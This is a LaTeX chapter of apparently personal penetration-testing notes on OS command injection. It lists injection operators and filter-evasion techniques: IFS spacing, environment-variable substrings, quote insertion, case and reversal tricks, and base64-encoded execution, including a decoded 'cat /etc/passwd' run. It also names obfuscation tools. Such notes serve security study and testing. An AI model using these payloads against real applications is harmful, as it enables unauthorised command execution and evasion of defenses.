\chapter{Command injection}
\section{introduction}
A Command Injection vulnerability is among the most critical types of
vulnerabilities. It allows to execute system commands directly on the back-end
hosting server, which could lead to compromising the entire network. If a web
application uses user-controlled input to execute a system command on the
back-end server to retrieve and return specific output, we may be able to
inject a malicious payload to subvert the intended command and execute our
commands.

Whenever user input is used within a query without being properly sanitized, it
may be possible to escape the boundaries of the user input string to the parent
query and manipulate it to change its intended purpose. This is why as more web
technologies are introduced to web applications, we will see new types of
injections introduced to web applications.

When it comes to OS Command Injections, the user input we control must directly
or indirectly go into (or somehow affect) a web query that executes system
commands. All web programming languages have different functions that enable
the developer to execute operating system commands directly on the back-end
server whenever they need to. This may be used for various purposes, like
installing plugins or executing certain applications.



\section{Detection}
The process of detecting basic OS Command Injection vulnerabilities is the same
process for exploiting such vulnerabilities. Attempt to append a command
through various injection methods. If the command output changes from the
intended usual result, this validate the vulnerability. This may not be true
for more advanced command injection vulnerabilities because it might be
necessary  may utilize various fuzzing methods or code reviews to identify
potential command injection vulnerabilities. the payload must then be gradually
built until command injection is  achieved.


To inject an additional command to the intended one, the following operators
may be used:
\begin{itemize}
    \item Semicolon (\verb+;+ /	\verb+%3b+): execute both commands
    \item New Line (\verb+ \n+ / \verb+%0a+):  	execute both commands
    \item Background (\verb+&+ /\verb+%26+): execute both commands (second output generally shown
    \item Pipe (\verb+|+ / \verb+%7c+) execute both commands (only second output is shown)
    \item AND (\verb+&&+ / \verb+%26%26+) execute both commands (only if first succeeds)
    \item OR (\verb+||+ / \verb+%7c%7c+) execute second command (only if first fails)
    \item Sub-Shell (\verb+``+ / \verb+%60%60+) execute both commands (Linux-only)
    \item Sub-Shell (\verb+$()+ / \verb+%24%28%29+) execute both commands (Linux-only)
\end{itemize}

Note: the semi-colon ;, will not work if the command was being executed with
Windows Command Line (CMD), but would still work if it was being executed with
Windows PowerShell.

\section{Filters}
\subsection{Bypassing Front-End Validation}

use burp, zap of dev tool of the browser to remove the validator.

\subsection{Bypass blacklisted operators}
use the url encode

\subsection{Bypass blacklisted spaces}
use \verb-+-, \verb+%09+ (tab), \verb+${IFS}+ (on linux) or brace expression
which adds space between parameters \verb+{ls,-l,-a}+
see
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space}{PayloadsAllTheThings}
    for more examples.


\subsection{Bypass other blacklisted characters}
\subsubsection{linux}
the shell substring function can be used on env variables to obtain special
caracters be might depend on the content
\begin{verbatim}
# / with  ${PATH:0:1}
# ; with ${LS_COLORS:10:1} 
<INPUT>${LS_COLORS:10:1}${IFS}ls
\end{verbatim}

Charactere shifting: identify the character wich comes before the expected
on in the ascii table with \verb+ascii -d+ and use it in the following
command to validate:
\begin{verbatim}
echo $(tr '!-}' '"-~'<<<CHAR)
\end{verbatim}

\subsubsection{Windows command line}
\begin{verbatim}
%HOMEPATH:~6,-11%
\end{verbatim}

\subsubsection{Windows PowerShell}
\begin{verbatim}
$env:HOMEPATH[0]
\end{verbatim}

PowerShell also allows character shifting

\subsection{Bypass blacklisted commands}

One very common and easy obfuscation technique is inserting certain characters
within ithe command that are usually ignored by command shells like Bash or
PowerShell and will execute the same command as if they were not there. Some of
these characters are a single-quote \verb+'+ and a double-quote \verb+"+, in addition to a
few others.

For example \verb+w'h'o'am'i+ will execute \verb+whoami+

{\bf Important}: 
\begin{itemize}
    \item the types of quotes cannot be mixed
    \item the number of quotes must be even. 
\end{itemize}

Linux only additional characters:
\begin{itemize}
    \item \verb+\+ (\verb+w\ho\am\i+)
    \item \verb+$@+ (\verb+who$@ami+)
\end{itemize}


Windows only additional characters:
\begin{itemize}
    \item \verb+^+ (\verb+who^ami+)
\end{itemize}

\subsection{Advanced command obfuscation}
\subsubsection{Case manipulation}
On windows as command are not case-sensitive command can be directly
manipulated \verb+WhOamI+ whereas on linux  the following command which uses
\verb+tr+ to replace all upper-case characters with lower-case characters can
be used:
\begin{verbatim}
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
\end{verbatim}


\subsection{Reversed command}
Get the reverted string using \verb+echo 'whoami' | rev+ then use it as a
subcommand for example for \verb+whoami+ \verb+$(rev<<<'imaohw')+

on windows PowerShell:
\begin{verbatim}
"whoami"[-1..-20] -join ''
iex "$('imaohw'[-1..-20] -join '')"
\end{verbatim}

\subsection{Encoded commands}

\begin{verbatim}
echo -n 'cat /etc/passwd | grep 33' | base64

bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
\end{verbatim}

on windows PowerShell:
\begin{verbatim}
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

iex "$([System.Text.Encoding]::Unicode.
    GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
\end{verbatim}

\section{tools}

Dealing with advanced security tools, may not allow to use basic, manual
obfuscation techniques. In such cases, it may be best to resort to automated
obfuscation tools.

\href{https://github.com/Bashfuscator/Bashfuscator}{Bashfuscator} on linux

\href{https://github.com/danielbohannon/Invoke-DOSfuscation}{DOSfuscation} on windows

\section{links}
\href{https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection}{PayloadsAllTheThings}

